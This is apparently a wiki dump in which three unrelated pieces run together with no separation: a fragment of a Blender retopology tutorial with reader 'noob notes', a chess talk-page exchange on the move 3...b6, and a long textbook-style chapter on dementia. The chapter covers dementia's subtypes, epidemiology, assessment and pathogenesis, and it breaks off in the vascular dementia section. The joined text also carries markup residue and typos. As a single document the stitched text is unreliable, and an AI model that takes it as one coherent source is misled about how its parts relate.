** '''Noob note:''' ''More vertices in your cylinder will mean more intuitive work and figuring [more loop cuts, face making, etc.] later on when retopo-ing.  I suggest following the tutorial first, then try to do a more advanced model with more faces / vertices when you understand the tool.  If you have trouble [as I did] getting really nice geometry, do [http://video.google.com/videosearch?sourceid=navclient&amp;rlz=1T4GGLR_enUS262US264&amp;q=blender%20retopo%20tutorial&amp;um=1&amp;ie=UTF-8&amp;sa=N&amp;hl=en&amp;tab=wv# a search for some tutorial videos].  There are many really helpful ones.''
* ''Add-&gt;Mesh-&gt;Circle'' ('''Noob note:''' ''To make sure you create these as separate objects, be in Object Mode (not Edit Mode).'')
** 8 vertices
** ''No fill''
* Rotate the circle by 90° at the Y axis ('''R'''-&gt;'''Y'''-&gt;'''90''').
* Move the circle in front of the cylinder('''G'''-&gt;'''X'''-&gt;'''2''').
* Switch to side view ('''Num-3''').
* Scale the circle to the diameter of the smaller cylinder. 

('''Noob note:''' ''I felt this was a little unclear. What the author means is, scale the circle down until it is the size of the diameter of the smaller cylinder you are going to create from it later by extrusion.  You would be wise to scale it so it fits (straight backwards from view) inside the two closest faces of the cylinder as per '''Fig. 4a''' if you wish to follow the tutorial. '')

* Switch to edit mode, select all vertices of the circle.

('''Noob note:''' ''To recap: you should be in edit mode for the circle, with the all of it selected, with the cylinder object directly behind it in from your viewpoint in orthographic mode.)''
Make sure that you don't work in ''Wireframe'' view.

* Click on ''Retopo-&gt;Retopo All'' in the ''Mesh'' panel of the ''Editing'' buttons.

('''Noob note:''' ''What Retopo does [in this case]; is project the selected topography of an object in edit mode directly backwards from your selected view point onto the topography of another [seperate] object.  So you must be lined up view-wise for this to work. I've also found sometimes I must press the '''Enter key''' for the'' '''Retopo All''' '' to take effect even if I've selected it with the '''LMB''' ''.)

If the vertices of the circle are not adjacent to the cylinder but have jumped to wrong places undo the last step ('''Ctrl-Z'''), deselect and reselect all vertices and try again. This does help (strangely). ''Retopo'' works with limited accuracy, if the vertices don't fit perfectly you have to move them by hand.

* Change to object mode, select additionally the cylinder and join both objects ('''Ctrl-J''').
Now you work best in ''Wireframe'' view.
* Add three loop cuts ('''Ctrl-R'''-&gt;'''3''')
* Delete the middle vertex.
* Connect the free vertices ('''F''').
* Select the circle.
* Extrude and clean up.


'''Noob Note -:''' I couldn't follow this last pipe tutorial with blender 2.6, so I made a video on how to do it once i worked it out.
Thought i would put link to it in case anyone else needed help.  (hope that's OK )

==On evaluating 3. ...b6 as = ==
 
Won't 3. ...b6 allow a simple 4. e4. ?

Black can always play b6 later, such as in Fischer's System &quot;4. ... b6&quot;, the response to the Rubenstein variation. {{unsigned|93.95.81.1|02:06, 24 February 2011‎}}

: Rubinstein variation is part of the [[Chess Opening Theory/1. e4/1...e6/2. d4/2...d5/3. Nc3|French Defense]], which is a completely different family of openings.  In case of doing 4.e4, I see no reason not to capture the undefended pawn, especially when it causes white to do reactionary moves and places the knight in the center of the board (where it has the potential to fork).   &lt;br/&gt; Also, the [[Chess Opening Theory/1. d4/1...Nf6/2. c4/2...e6/3. Nf3/3...b6|Queen's Indian Defense]] already has a slightly better option of 4. e3 that doesn't give such a vulnerability. --[[User:Sigma 7|Sigma 7]] ([[User talk:Sigma 7|discuss]] • [[Special:Contributions/Sigma 7|contribs]]) 17:32, 3 January 2013 (UTC)</text>

== Dementia, Delirium, and Psychiatric Symptoms Secondary to General Medical Conditions ==
;Dementia, Delirium, and Psychiatric Symptoms

[[Category:Collections|Dementia, Delirium, and Psychiatric Symptoms]]
'''Introduction'''


	In this chapter, we consider three related types of medical psychiatric disorders, usually accompanied by behavioral abnormalities: ''dementia,'' ''delirium'', and neurobehavioral disorders'' due to general medical conditions''. The common factor in these admittedly diverse conditions is a pathological alteration of brain structure and/or function, leading to abnormalities in cognition, affect, perception, or behavior. In the older U.S. literature, the term &quot;organic brain syndrome&quot; was often used to distinguish these conditions from so-called ''functional'' psychiatric disorders, such as schizophrenia or major depression. Indeed, the &quot;organic&quot; designation is retained in the ICD-10 classification (ICD-10, 1993). 
In our view, however, the terms &quot;organic&quot; and &quot;functional&quot; suggest a false dichotomy. As we have learned more about the pathophysiology of common psychiatric disorders, such as schizophrenia or depression, the conceptual demarcation between these conditions and those discussed in the present chapter has become less distinct. For example, decreased metabolic function in frontal brain regions may be observed in both dementia and major depression, though the course and prognosis of these conditions differ markedly. Similarly, abnormalities in the cholinergic system may be present in both Alzheimer\’s Disease and schizophrenia (Raedler et al, 2007), notwithstanding the many differences between these disorders. Advanced neuroimaging techniques, genetic studies, as well as abnormal neurobiologic function  in several animal models suggest receptor and circuit disturbances, even in the absence of traditional neurological abnormalities such as stroke or tumor. For all these reasons, we generally avoid the term &quot;organic&quot; in this chapter, but ''do'' use it when a particular study, author, or context justifies it. 
The term &quot;cognitive disorder&quot; is often used to encompass delirium, dementia, and related conditions. This term appropriately emphasizes that a ''disturbance in memory, language, or attention'' is usually a cardinal feature of these disorders. However, the term &quot;cognitive disorder&quot; is far from ideal, since other aspects of consciousness, mood, and behavior may be strikingly abnormal in delirium, dementia, and related conditions. For example, the patient with frontal lobe dementia may show marked behavioral disinhibition, while the patient with Parkinson\’s Disease and dementia may show signs of major depression.  
The disorders discussed in this chapter are seen in many health-care environments, and are by no means confined to psychiatric settings. For example, between 11-16% of inpatients on general medical units may experience delirium at some time during their admission (Levkoff et al, 1991). In skilled nursing facilities, at least 14 % of residents may suffer from some form of dementia (Sabbagh et al, 2003), with some studies finding that more than 50% of nursing home beds are occupied by patients with Alzheimer\’s Disease (Sadock &amp; Sadock, 2007, p. 329). And while there are no reliable prevalence statistics for psychiatric symptoms due to general medical conditions (GMCs), these disorders appear to be common in emergency department (ED) settings, where they often go undiagnosed. Indeed, in one study ( Tintinalli et al, 1994) the chart was documented &quot;medically clear&quot; in 80% of ED patients in whom medical disease should have been identified.
Finally, a word about diagnostic systems: in most respects, there are more similarities than differences between the DSM-IV and ICD-10 classifications of the disorders discussed in this chapter; indeed, our discussion emphasizes ''common features'' rather than the specific criteria set forth in these two systems. However, when significant differences are clinically relevant, we will note them.

'''DEMENTIA'''

'''Phenomenology (Characteristic Features of the Dementias)'''

'''	'''Dementia may be broadly defined as ''a progressive, acquired impairment of cognitive function sufficient to cause functional decline, and occurring in a relatively normal (&quot;clear&quot;) level of consciousness''; i.e., in the absence of delirium (Sadock &amp; Sadock, 2007; Apostolova &amp; Cummings, 2008). We shall see, however, that there are some notable exceptions to this generalization, and that it is often more useful to define specific types of dementia. ''Global impairment of the intellect'' is a cardinal feature of dementia. More specifically, most dementia syndromes demonstrating the following neurobehavioral deficits:   
* Memory impairment (either impaired ability to learn new information, or to recall previous information), usually evident for at least 6 months
* Deterioration in judgment, planning, and organizing (e.g., impaired shopping, cooking, handling money)
* Absence of &quot;clouding of consciousness&quot; for a period long enough to demonstrate decline in memory
* Decline in emotional control or motivation; or a change in social behavior (e.g., emotional lability, irritability, apathy, loss of social graces). DSM-IV specifically emphasizes a significant impairment in social and/or occupational functioning, as a result of the aforementioned deficits
* DSM-IV emphasizes one or more of the following: ''aphasia'' (language disturbance), ''apraxia ''(impaired ability to carry out motor activity despite intact motor function), ''agnosia'' (failure to recognize objects despite normal sensory function); and ''disturbance in executive functioning'' (planning, organizing, sequencing, abstracting). In partial contrast, ICD-10 regards these as essentially ''supportive'' findings for diagnosis of dementia. 

The epidemiology, clinical features, and pathogenesis of dementia vary considerably, depending on the subtype; for example, ''dementia of the Alzheimer type (DAT), Vascular Dementia, Lewy Body Dementia'', etc. Nevertheless, it is common to encounter elderly patients in the clinical or nursing home setting who carry only the syndromic diagnosis of &quot;dementia&quot; (Jacobson et al, 2007). It is worth noting that not all definitions of dementia require memory impairment as a diagnostic criterion; indeed, some patients with ''frontotemporal dementia'' (FTD) may be severely affected with ''behavioral disturbances'' before memory impairment is prominent (Jacobson et al, 2007).  Dementia must be distinguished from so-called ''mild cognitive impairment'' (MCI), which appears to represent an intermediate stage between normal aging and dementia (Apostolova &amp; Cummings, 2008). Unlike those with dementia, MCI patients do ''not'' show significant impairment in activities of daily living. 

''Epidemiology of the Dementias''

	Dementia of some type may afflict as many as 28 million individuals world-wide, with direct costs for care estimated at 156 billion U.S. dollars (Wimo et al, 2006). Of the total number of demented individuals worldwide, the largest proportion (5.2 million, or 18.5%) lives in China (Wimo et al, 2006). If one groups all dementias together, the estimated prevalence is about 5% in the general population older than age 65, and 30% in those older than age 85 (Sadock and Sadock, 2007 p. 329). Findings on racial variations in dementia are somewhat equivocal, but most studies have reported higher frequencies of dementia among nonwhite persons (Husaini et al, 2003).  Disproportionately high rates of dementia among African-Americans may be due, in part, to a higher prevalence of both hypertension and stroke among elderly African-Americans. Women generally have higher rates of dementia than men, largely because women live longer (Husaini et al, 2003). However, vascular dementia appears to be more common in men. 
Dementia of the Alzheimer\’s Type (DAT, &quot;Alzheimer\’s Disease&quot;) is by far the most common type of dementia, making up roughly 35%-60% of cases worldwide (Mendez &amp; Cummings, 2003; Sadock and Sadock, 2007, p. 329). The wide range of these figures is due in part to some controversy over the classification of ''Lewy Body Dementia'' (LBD); i.e., if LBD is considered a variant form of DAT (Sadock and Sadock, 2007, p. 329), the prevalence figure for DAT tends toward the higher end of the range. Many geriatric psychiatrists consider LBD to be the second most prevalent dementia subtype (&quot;tied&quot; with mixed vascular dementia/DAT), with a prevalence of about 15%. About 10% of dementias are said to be represent pure vascular dementia, while another 5% represent fronto-temporal dementia (Mendez and Cummings, 2003; Jacobson et al, 2007). Some data suggest that the DAT/vascular dementia ratio is comparatively higher in South America and lower in Asia (Lopes &amp; Bottino, 2002), though the reasons for these trends are not clear. Miscellaneous causes of dementia—including cases due to Huntington\’s Disease, Creutzfeld-Jakob Disease,  Parkinson\’s, HIV infection, and other conditions—probably constitute fewer than 5% of the total. 
That said, there is a paucity of ''autopsy-based studies'' of dementia prevalence, which would presumably be more accurate than those based on clinical diagnosis alone. In one of the few such studies (Fu et al, 2004),  202 demented patients underwent brain-only autopsies, and the following types of dementia were found: 129 (63.8%) cases showed changes of severe Alzheimer disease; 21 (10.4%) showed combined neuropathologic abnormalities (Alzheimer disease plus another type of lesion, such as significant ischemic infarcts or diffuse Lewy body disease), 12 (5.9%) cases of relatively pure ischemic vascular dementia, 13 (6.4%) cases of diffuse Lewy body disease, and 8 (4.0%) cases of frontotemporal dementia. The remaining 19 (9.4%) patients showed various neuropathologic diagnoses, including normal pressure hydrocephalus and progressive supranuclear palsy. Notably, the authors concluded that, had these diagnoses been known ante mortem, the clinical care of the patients might well have been different (Fu et al, 2004). 

''Clinical Features of Dementia Subtypes''

* Cortical vs. subcortical distinction

The older literature on dementia often describes two broad subtypes that encompass many of the more pathologically-specific types of dementia. Though the distinction between so-called ''cortical'' and ''subcortical ''dementias is controversial, it remains a useful conceptual tool in preparation for understanding more specific forms of dementia (Turner et al, 2002). Although there is no specific neuropsychological pattern in subcortical dementia, this group of disorders is generally characterized by ''cognitive slowness, concomitant motor abnormalities,'' and a relatively ''low frequency of aphasias and apraxias'', compared with Alzheimer-type dementia (Turner et al, 2002).  The principal differences between cortical and subcortical dementias are summarized in Table 1. It is important to note that some conditions—such as multiple small strokes and certain toxic-metabolic disorders—produce symptoms of ''both'' cortical and subcortical dysfunction (Cummings, 1985). Furthermore, the cortical/subcortical distinction has become less useful as our understanding of specific dementia syndromes has increased (Turner et al, 2002). Indeed, Lerner and Riley (2008) have pointed out that the dementias of Huntington\’s and Parkinson\’s Disease—two putative &quot;subcortical&quot; dementias—are as different from each other as they are from Alzheimer\’s Disease, the classic &quot;cortical&quot; dementia. Furthermore, these authors note that &quot;…the pathological basis for dementia in (Parkinson\’s Disease) is now known to lie in the cerebral cortex…effectively rendering its designation as a &quot;subcortical&quot; dementia untenable.&quot; (p. 908). In short—though useful as a rough, first-pass approximation—the designations &quot;cortical&quot; and &quot;subcortical&quot; are likely to be modified with more specific pathoanatomical and descriptive assessments.

* Dementia of the Alzheimer Type (DAT)

''Case vignette: Mrs. A, a 91-year-old widowed Caucasian woman in good general health, was seen by her family physician for complaints of &quot;forgetting things a lot lately.&quot; Mrs. A\’s daughter, who often helped her mother with household chores, had noticed a change in her mother\’s thinking and behavior over the past two years. &quot;Mom used to be sharp as a tack and never forgot a thing,&quot; she reported. &quot;Nowadays, she has trouble remembering even simple things, like turning off the stove, or in what room she keeps all her bills and papers. The other day, I found that she had left the bath running for over an hour, and it flooded the whole upstairs. Sometimes, Mom confuses me with her sister, who died over twenty years ago. When I try to explain who I am, Mom sometimes gets kind of irritable with me, and says I\’m trying to confuse her.&quot; There was no history suggestive of stroke, sudden change in mental status, or loss of gross motor or sensory function. On mental status exam, the patient was pleasant, socially appropriate, and in no acute distress. She was oriented to the year, but not to month, day, or date. She recalled only one word item after three minutes. She could not remember the name of the two most recent U.S. Presidents, but was able to speak knowledgeably about the Presidents during the U.S. Great Depression (1929-1941). When asked to name three objects on the physician\’s desk (stapler, paper clip, and calendar), she named them as &quot;stapler, paper grip, and day book.&quot; A provisional diagnosis of &quot;dementia, probably of the Alzheimer\’s type&quot; was made by the physician. ''

	As the vignette suggests, DAT (Alzheimer\’s Disease) is characterized most saliently by a gradual onset and progression of cognitive decline. Frank signs and symptoms of DAT often follow a prodromal stage of mild memory impairment that does not markedly interfere with activities of daily living'''. '''With disease progression, the patient shows more global cognitive decline, with disturbance in language, visuospatial skills, executive functioning, and social interaction. Typical of progressive DAT is a ''transcortical sensory aphasia, ''in which the patient shows fluent word output and preserved ability to repeat spoken language, but impaired speech comprehension (Apostolova &amp; Cummings, 2008). '' ''With further progression of DAT, the patient shows impaired judgment and reduced ability to carry out activities of daily living. Disturbances in sleep-wake cycle or appetite often ensue. Although depression is often considered a hallmark of ''subcortical'' dementias, it is actually a common feature in DAT. However, only about half of patients with depression/dysphoria in DAT meet full criteria for major depression (Apostolova &amp; Cummings, 2008). Irritability, agitation (including pacing, &quot;fidgeting&quot; or verbal outbursts) and psychotic features (such as visual hallucinations and delusions of having been robbed) are also common in DAT, and impose great emotional burdens on the patient\’s family and caregivers. Patients with ''early-onset DAT'' (see under Pathogenesis) may show atypical features, such as prominent aphasia, myoclonic jerks, emotional lability, or obsessive-compulsive symptoms (Apostolova &amp; Cummings, 2008).  
* Vascular Dementias
Vascular dementia (VaD) is considered the third leading cause of dementia in the elderly, after DAT and Dementia with Lewy Bodies (Apostolova &amp; Cummings, 2008). However, some experts regard VaD as a heterogeneous syndrome, rather than a distinct disorder, in which the underlying cause is some type of cerebrovascular disease and the end result is dementia (Wright, 2007).  Several subtypes of VaD are recognized.  ''Multi-infarct dementia'' (MID)—the older term for VaD—involves multiple, relatively large infarctions, usually due to recurrent cerebral emboli originating from the heart, thromboembolic events, or atherosclerotic plaques. ''Single, strategically-placed infarct; lacunar state; ''and'' Binswanger\’s Disease'' (subcortical arteriosclerotic encephalopathy  (SAE) due to arteriosclerotic narrowing of deep penetrating white matter arterioles) are also considered VaD subtypes (see below). 
In partial contrast to DAT, vascular dementia often shows a ''subcortical pattern'', with prominent psychomotor slowing, executive dysfunction, and mood changes. Speech difficulties (dysarthria) are common. Compared with DAT, memory deficits in VaD are more often related to ''retrieval'' than to initial ''encoding ''of memories; for example, the patient with VaD may be unable spontaneously to &quot;retrieve&quot; the name of a recently specified object (such as &quot;chair&quot;), but can do so if provided a clue (&quot;It rhymes with hair&quot;). In contrast to the course of DAT, VaD of the multi infarct variety may have a &quot;stuttering&quot; course, with a ''stepwise progression'' of cognitive deterioration, often accompanied by lateralizing neurological deficits (Sadock &amp; Sadock, 2007). SAE often has an insidious course that may be temporally difficult to distinguish from DAT. The neurological findings of multi-infarct dementia may include focal findings such as weakness, spasticity, rigidity, and extensor plantar reflex (positive Babinski sign). Compared with DAT, VaD has a higher incidence and greater severity of ''new-onset depression, ''especially in older individuals; this is sometimes referred to as &quot;vascular depression.&quot; Psychosis is also relatively common in VaD. 
* Lewy Body Dementia 
Barely recognized only 20 years ago, Dementia with Lewy Bodies (DLB) is now believed to be the second most prevalent dementia of old age, accounting for some 15-20% of cases (McKeith et al, 1996). Compared with DAT, memory impairment in DLB is less pronounced, but ''cognitive fluctuations'' are severe. Variability in the patient\’s attention, alertness, and level of consciousness may reach the proportions of frank ''delirium'' (see below, Delirium). Recurrent ''visual hallucinations'' are also one of the hallmarks of DLB. DLB shares features with the dementia of ''Parkinson\’s Disease'' (PD), and diagnosis is conventionally determined by the temporal pattern of motor symptoms: if these precede cognitive decline by more than 12 months, PD is diagnosed, whereas motor symptoms occurring within a year of cognitive decline would be diagnosed as DLB (Apostolova &amp; Cummings, 2008). ''Bradykinesia, rigidity, resting tremor, ''and'' gait disturbance ''are commonly seen in DLB, but cases of DLB without extrapyramidal symptoms are reported. Other clues to the presence of DLB include a history of falls or syncopal episodes; REM (rapid eye movement) sleep behavior disorder (such as violent behaviors during REM sleep); and extreme sensitivity to neuroleptics and atypical antipsychotics (Apostolova &amp; Cummings, 2008; Jacobson et al, 2007—see under Treatment). 
* Fronto-temporal dementia

Fronto-temporal dementia (FTD) is actually a group of three related disorders, involving focal atrophy of the frontal and/or temporal lobes, accompanied by characteristic neurobehavioral impairments (Apostolova &amp; Cummings, 2008). So-called Frontal Variant FTD is also known as ''Pick\’s Disease'' and makes up the majority of FTD cases. (''Primary Progressive Aphasia'' and ''Semantic Dementia ''are less common FTD variants, and will not be discussed here). 
Patients with Frontal Variant FTD typically do not complain of cognitive problems to the same extent as patients with DAT; rather, they show insidious but profound alterations in personality, social skills, and impulse control. However, neuropsychological testing does reveal deficits in verbal fluency, abstract thinking and planning, and verbal memory, often with sparing of ''visual ''memory. Compared to DAT patients, those with FTD usually have more mood disturbance, behavioral disinhibition, and abnormal motor behavior. Curiously, nearly half of all FTD patients—two years after diagnosis--will show one or more stereotyped or obsessive-compulsive behaviors. These may include hand clapping, hoarding, and repetitive or ritualistic  behaviors (Mendez &amp; Perryman, 2002; Apostolova &amp; Cummings, 2008). Twenty per cent of FTD patients may develop a form of Kluver-Bucy Syndrome (hyperorality, hypersexuality, and abnormal exploratory behavior) two years after diagnosis (Mendez &amp; Perryman, 2002). 

''Case vignette: Mr. J. was a 57-year-old married white male, with a two-year history of marked &quot;change in personality&quot;, according to his wife. &quot;It\’s like night and day,&quot; she told the neurologist, &quot;compared to the way Fred used to be. He was the kindest, gentlest man I ever knew. Now, it\’s like Jekyll and Hyde—I\’m afraid to look at him cross-eyed, for fear he will scream at me, or worse.&quot; Mr. J. had always been a very empathic individual, but now seemed unconcerned with the wishes or needs of others. His hygiene and personal grooming had deteriorated over the past year, and he had begun to engage in bizarre rituals every morning; for example, counting to 100 before getting out of bed, then eating exactly six large muffins, without saying a word to his wife. Most of the time, Mr. J. seemed &quot;flat&quot; and apathetic; however, when his wife questioned any of his actions, he would shout at her or throw some object across the room. ''
''A neurological evaluation found evidence of significant frontal lobe dysfunction and positive &quot;grasp reflex&quot;, but was otherwise within normal limits. ''
* Miscellaneous Dementia Syndromes

In addition to the aforementioned types of dementia, about 5% of patients will have dementia due to miscellaneous causes, including 
''Huntington\’s Disease, Creutzfeld-Jakob Disease,  Parkinson\’s Disease, HIV infection'', and other conditions''.  Huntington\’s Disease'' (HD)—an autosomal dominantly-transmitted, progressive disorder—has its peak onset in the fourth and fifth decade, though a smaller peak occurs in the 20s. The classic presentation for HD is a combination of ''chorea and dementia'', in the setting of a positive family history; however, the earliest presentation may be with ''affective'' or ''psychotic ''symptons (Lerner &amp; Riley, 2008). A &quot;tendency toward suicide&quot; in HD was recognized by Huntington himself, and suicidal ideation may be the presenting problem. ''Creutzfeld-Jakob Disease'' (CJD) is caused by an abnormal protein called a ''prion'', and typically presents as a rapidly-progressive dementia, accompanied by ataxia and multi-focal myoclonic jerks. A third of patients with CJD show a prodrome of fatigue, headache, insomnia, malaise, or depression (Apostolova &amp; Cummings, 2008). Dementia due to ''Parkinson\’s Disease'' (PD) occurs in roughly 30% of patients with PD, with a larger percentage afflicted as age increases (Lerner &amp; Riley, 2008). However, cognitive symptoms can occur at any stage of PD, and are often characterized by slowed mentation (bradyphrenia), impaired visuo-spatial skills (such as facial recognition and operating objects in space) and executive dysfunction. Affective disturbance—especially depression—is very common in PD, and may be present in over 60% of cases. Anxiety is also commonly seen in PD, although less frequently than depression (Lerner &amp; Riley, 2008). Psychosis is also encountered in PD, usually related to dopaminergic effects of anti-Parkinsonian medication (Lerner &amp; Riley, 2008). 
 Cognitive deficits associated with ''HIV infection'' are considered part of a continuum, known as ''HIV-1-associated cognitive-motor complex (HCMC). ''Frank HIV dementia is the most serious form of HCMC, and occurs in roughly 30% of HIV-infected individuals (Fernandez &amp; Tan, 2008). The ''early'' clinical picture in HCMC is usually characterized by ''subcortical'' features (see Table 1), including reduced information processing speed; motor slowing or dyscoordination; and depressed mood. However, as the illness progresses, more classically &quot;cortical&quot; features may develop, including aphasia, agnosia, apraxia, and frontal lobe symptoms (Fernandez &amp; Tan, 2008). Behavioral disinhibition, mania, and psychotic features are often found in the later stages of HIV-associated dementia. 


'''Assessment and Diagnostic Testing'''

'''	'''In addition to obvious abnormalities in the ''mental status exam'', the patient with dementia may show a variety of deficits on more sophisticated ''screening instruments'' and  ''neuropsychological assessments'', and on ''neuroimaging'' studies. 
* Prototypical mental status findings in dementia 
Considering the diverse subtypes of dementias, it is difficult to generalize about findings on mental status exam. Furthermore, the clinician must proceed with the caveat that a patient cannot be diagnosed with dementia, in the presence of active ''delirium'' (see Delirium, section  ). Nonetheless , if we &quot;average out&quot; the differences between cortical and subcortical dementia presentations, the following mental status exam could be considered typical of the patient with ''moderately severe dementia'': 
''The patient appears alert, but apathetic and somewhat agitated, and is seen to be twisting her fingers through her hair. Her speech is fluent and well-articulated, but she uses many long, meaningless phrases (such as, &quot;The thing of it is, you see, I need the thing to be, you know, whatever.&quot;). She is oriented to year, but not the month or day. She recalls only 1 of three named items, after a three minute interval of distraction. She cannot remember the names of the college from which she graduated, and gave an incorrect response when asked, &quot;Who is the current president of the U.S.?&quot; When shown a picture of a cup, she calls it a &quot;vase&quot;, and identifies the examiner\’s stethoscope as a &quot;hearing aid&quot;. She is able to subtract 10 from 100 correctly, but cannot do serial 10\’s accurately (&quot;90, 85, 75, 65, 50, 40…&quot;). She produces a poorly-constructed drawing when asked to copy a cube, and her drawing of a clock reading &quot;ten past two&quot; was incorrect (with the big hand placed at the &quot;10&quot; position). When asked to interpret the proverb, &quot;The early bird catches the worm,&quot; her response is very concrete (&quot;The bird that gets up early will catch the worm.&quot;). When asked if she has any particular fears lately, she replies, &quot;I don\’t know what the neighbors think of me, but I know they steal from my bedroom.&quot;'' (Spitzer et al, 1994). 
* Screening instruments and  neuropsychological assessments
The most widely-used screening instrument for dementia is the Mini-Mental State Exam (MMSE) developed by Folstein ( Folstein et al, 1975), an 11-item test that evaluates orientation, registration, attention and calculation, recall, and language. The maximum score on the MMSE is 30 and—depending on age and education--a score of 28 or higher is usually considered &quot;normal.&quot; A &quot;low normal&quot; score (24 or higher) appears to predict development of dementia after three years (Braekhus et al, 1995). The MMSE does not specifically examine executive cognitive function. An expanded version of the MMSE (the 3MS) does include some executive function items, and may be more sensitive, specific and predictive of functional outcome than the MMSE (Grace et al, 1995). Neither the MMSE nor the 3MS is ideally suited to detecting features of &quot;milder&quot; or subcortical dementia, or detecting impairments in social or operational functioning. For HIV-related dementia, the HIV dementia scale or the Mental Alternation Test may be better alternatives (van Harten et al, 2004; Billick et al, 2001). More complete neuropsychological assessment of dementia usually includes use of the Wechsler Adult Intelligence Scale-III (WAIS-III), the Wechsler Memory Scale (WMS), the Rey Complex Figure, and Trail Making Test (Howieson &amp; Lezak, 2008), among others. These ancillary tests may be helpful in pinpointing specific functional impairments and their neuroanatomical correlates. 

* '''Neuroimaging studies'''

Neither the ICD-10 nor the DSM-IV criteria for dementia require any corroborative evidence obtained from neuroimaging studies. Nevertheless, neuroimaging techniques such as magnetic resonance imaging (MRI) or postitron emission tomography (PET) may be helpful in clarifying diagnosis and ruling out other types of brain disease, such as normal pressure hydrocephalus. Indeed, the American Academy of Neurology recommends a non-contrast structural image (CT or MRI) in the initial evaluation of cognitive impairment (Apostolova &amp; Cummings, 2008). With DAT, global cerebral atrophy, especially in mesial temporal and parietal regions, is the usual finding on CT or MRI. On PET or SPECT (single-photon emission computed tomography), DAT patients usually show bilateral hypometabolism in mesial temporal and parietal regions. Recently, a novel radio-labeled PET imaging agent, ''18F-AV-45'', has been developed, and may eventually provide a practical approach for routine brain imaging for Alzheimer\’s Disease (Alzheimer\’s Association, 2008). 
In dementia with Lewy Bodies (DLB), bilateral parietal and ''occipital ''hypoperfusion is seen. The latter helps distinguish DLB from DAT, and may explain the high prevalence of ''visual ''hallucinations in DLB. Structural imaging (CT, MRI) is not helpful in diagnosing DLB (Lerner &amp; Riley, p. 919). In frontotemporal dementia (FTD), the expected hypometabolism is seen in frontotemporal regions, using PET scanning (Apostolova &amp; Cummings, 2008). Structural imaging (such as MRI) shows distinct profiles for the three main subtypes of FTD, though some degree of frontal and/or temporal lobe involvement is seen in all three subtypes.
In vascular dementia, both CT and especially MRI can be useful in defining cortical and white matter abnormalities.  In multi-infract or lacunar states, evidence of prior infarct can be seen. In SAE, periventricular white matter abnormalities can frequently be seen, although limited periventricular abnormatilies just anterior or proximal to the lateral ventricle can also be seen in normal aging.  Periventricular abnormalities of greater size or distance from the ventricles, or extending into the centrum semiovale, are more likely to represent evidence of clinically significant disease.  
* '''Investigational Biomarkers'''
Given the uncertainties of early dementia diagnosis, there has been great interest in a &quot;blood test&quot; or other valid biomarker for DAT, the most common type of dementia. Recently, for example, researchers in Germany found differences in levels of ''CD-69'', a protein involved in white blood cell growth and production, in normal subjects versus those with DAT or Parkinson\’s-related dementia (Alzheimer\’s Association, 2008). Irish researchers have focused on the enzyme ''beta-secretase'' (BACE1) activity in the brain. (BACE1 is one of two enzymes involved in the pathological processing of ''amyloid precursor protein'' (APP)—see below, under Pathogenesis).   High levels of BACE1 in the spinal fluid appear to be correlated with development of DAT. At present, these remain promising, but only investigational, techniques (Alzheimer\’s Association, 2008).

'''Pathogenesis of Dementias'''

* '''Biogenetic determinants and pathophysiology'''
''Dementia of the Alzheimer Type''
''	''
From the biogenetic standpoint,'' ''Alzheimer\’s Disease (DAT) appears to be of two main types: ''late-onset'' (sporadic) and ''early-onset''. When DAT begins after age 65 (late onset), its mode of inheritance appears to involve a constellation of genes, probably influenced by epigenetic factors (i.e., influences that do not change DNA sequence) such as diet and exercise. However, increasing age is the most important risk factor, with rates of DAT rising to 40% in those 85 years or older. Increasing age acts synergistically with the ''apolipoprotein E'' (APOE) ''gene polymorphism'' on chromosome 19. The APOE gene takes three major forms (''alleles''), termed ''ApoE2'', ''ApoE3'', and ''ApoE4''. APOE4 (E4) greatly increases the likelihood of late-onset DAT; i.e., individuals with two E4 genes develop DAT eight times more frequently than do those with no E4 gene. (Sadock and Sadock, 2007 p. 330; Apostolova &amp; Cummings, 2008). It appears that E4 promotes ''aggregation of amyloid β'' (Aβ), which leads to a variety of pathological changes in brain tissue (see below). 
In ''early-onset'' DAT, instead of—or possibly in addition to—APOE4, three ''autosomal dominant mutations'' appear to be important: the APP gene mutation on chromosome 21; the presenilin-1-gene mutation on chromosome 14; and the presenilin-2 gene mutation on chromosome 1. As noted above, early-onset DAT may be associated with atypical features, as well as shorter survival time (Apostolova &amp; Cummings, 2008).   
The classic pathological findings in DAT is the presence of ''senile plaques, neurofibrillary tangles, neuronal and synaptic loss'', and'' granulovascular degeneration of neurons'' (Sadock &amp; Sadock, 2007, p. 330). The pathophysiology of DAT is integrally related to the over-production or accumulation of ''amyloid β'' (Aβ). The \’amyloid cascade hypothesis\’ of DAT posits that abnormal enzymatic processing of ''beta-amyloid precursor protein'' (βAPP) leads to overproduction of neurotoxic Aβ peptides. These abnormal peptides polymerize (form chains) and &quot;clump together&quot;, forming several types of destructive, extracellular inclusion bodies called ''plaques''. The first plaques appear in temporal-occipital association regions in patients with DAT. In addition, DAT may involve abnormal phosphorylation of a structural protein called ''tau'', which is involved in microtubulular transport—the intracellular &quot;highway system&quot; that transports vital constituents within neurons (Apostolova &amp; Cummings, 2008). In DAT, hyper-phosphorylated tau forms distructive intracellular inclusions called ''neurofibrillary tangles'' (NFTs).  Together, these plaques and tangles &quot;choke off&quot; normal neuronal function and neurotransmitter production in DAT, particularly affecting the production of ''acetylcholine'' (ACh) and norepinephrine. Degeneration of cholinergic neurons is present in the ''nucleus basalis of Meynert'' in persons with DAT, and low brain levels of ACh and choline acetyltransferase are also found. Cholinergic deficits provide the rationale for use of ''cholinesterase inhibitors'' in the treatment of DAT (see below, Treatment). In addition, overactivation of NMDA receptors by the excitatory neurotransmitter, ''glutamate'', is believed to play a role in DAT, and is the basis for one pharmacological treatment (see below re: memantine). Recently, it was discovered that elevated serum levels of ''amyloid β ''are associated with reduced cognitive function even in healthy older adults, similar to patterns observed in early DAT (Gunstad et al, 2008). 

''Vascular Dementia ''
	VaD is caused by cumulative ischemic or hemorrhagic brain damage, usually secondary to cerebrovascular and cardiovascular pathology, and is often seen in association with hypertension, diabetes and hyperlipidemia (Apostolova &amp; Cummings, 2008). There are somewhat conflicting data regarding the contribution of the ApoE gene to the pathogenesis of VaD, but any such contribution appears smaller than that in DAT (Higuchi et al, 1996). 
''Multi-infarct dementia'' (MID)—the older term for VaD—usually involves infarcts in the territory of the ''middle cerebral artery'' and surrounding (&quot;watershed&quot;) regions. The middle cerebral artery is the largest cerebral artery and is the vessel most commonly affected by cerebrovascular accident. It supplies most of the outer convex brain surface, nearly all the basal ganglia, and the posterior and anterior internal capsules (Slater, 2008). In VaD, infarcts are also seen in the basal ganglia and periventricular white matter.
